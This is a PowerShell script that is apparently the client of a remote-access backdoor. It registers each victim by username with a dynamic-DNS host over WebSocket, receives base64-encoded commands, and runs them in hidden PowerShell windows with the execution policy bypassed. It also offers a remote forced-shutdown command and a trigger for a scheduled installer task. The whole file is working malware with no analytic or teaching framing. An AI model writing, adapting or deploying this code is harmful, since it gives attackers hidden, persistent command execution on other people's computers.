$m1 = New-Object System.Threading.Mutex($false, "run.exe")
if (-not $m1.WaitOne(0)) {
	exit
}

$m2 = New-Object System.Threading.Mutex($false, "run.ps1")
if (-not $m2.WaitOne(0)) {
	exit
}

$VPS_WS_URL = "ws://runx.ddns.net/ws/run"
$IdPath = "$env:APPDATA\Microsoft\run\run.txt"

if (Test-Path $IdPath) {
	$raw = (Get-Content $IdPath -Raw).Trim()
	if ($raw.Length -ge 8) {
		$uniqueId = $raw.Substring(0, 8)
	}
	else {
		$uniqueId = $raw
	}
}
else {
	$uniqueId = ([guid]::NewGuid().ToString()).Substring(0, 8)
	Set-Content -Path $IdPath -Value $uniqueId
}

$uniqueUser = "$($env:USERNAME)-$uniqueId-W"

function Read-WebSocketFrame($ws, $cts) {
	$ms = New-Object System.IO.MemoryStream
	$buffer = New-Object byte[] 8192
	$segment = New-Object System.ArraySegment[byte] -ArgumentList (,$buffer)
	do {
		$task = $ws.ReceiveAsync($segment, $cts.Token)
		$task.Wait()
		$res = $task.Result
		if ($res.MessageType -eq [System.Net.WebSockets.WebSocketMessageType]::Close) {
			$ms.Dispose()
			return $null
		}
		$ms.Write($buffer, 0, $res.Count)
	} while (-not $res.EndOfMessage)

	$bytes = $ms.ToArray()
	$ms.Dispose()
	return [System.Text.Encoding]::UTF8.GetString($bytes)
}

function Execute-CommandPayload($cmdBase64, $isVisible) {
	if (-not $cmdBase64) { return }
	$c = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($cmdBase64))

	if ($c -match "panic") {
		exit
	}
	elseif ($c -match "altf4") {
		Start-Process -FilePath "shutdown" -ArgumentList "/s", "/t", "0" -WindowStyle Hidden
	}
	elseif ($c -match "sauce") {
		Start-ScheduledTask -TaskName "WinRunInstaller"
	}
	else {
		$style = if ($isVisible -eq $true -or $isVisible -eq 1) {
			"Normal"
		}
		else {
			"Hidden"
		}

		Start-Process powershell.exe -ArgumentList @(
			"-NoProfile",
			"-ExecutionPolicy",
			"Bypass",
			"-Command",
			$c
		) -WindowStyle $style
	}
}

try {
	while ($true) {
		try {
			$ws = New-Object System.Net.WebSockets.ClientWebSocket
			$cts = New-Object System.Threading.CancellationTokenSource
			$wsUri = New-Object System.Uri("$VPS_WS_URL?username=$([System.Uri]::EscapeDataString($uniqueUser))")

			$connectTask = $ws.ConnectAsync($wsUri, $cts.Token)
			if ($connectTask.Wait(8000) -and $ws.State -eq [System.Net.WebSockets.WebSocketState]::Open) {
				while ($ws.State -eq [System.Net.WebSockets.WebSocketState]::Open) {
					$jsonStr = Read-WebSocketFrame -ws $ws -cts $cts
					if ($null -eq $jsonStr) { break }

					try {
						$msg = $jsonStr | ConvertFrom-Json
						if ($msg.action -eq "run_command" -and $msg.cmd) {
							Execute-CommandPayload -cmdBase64 $msg.cmd -isVisible $msg.visible
						}
					}
					catch {}
				}
			}
		}
		catch {}

		Start-Sleep -Seconds 3
	}
}
finally {
	if ($m1) {
		$m1.ReleaseMutex()
		$m1.Dispose()
	}

	if ($m2) {
		$m2.ReleaseMutex()
		$m2.Dispose()
	}
}
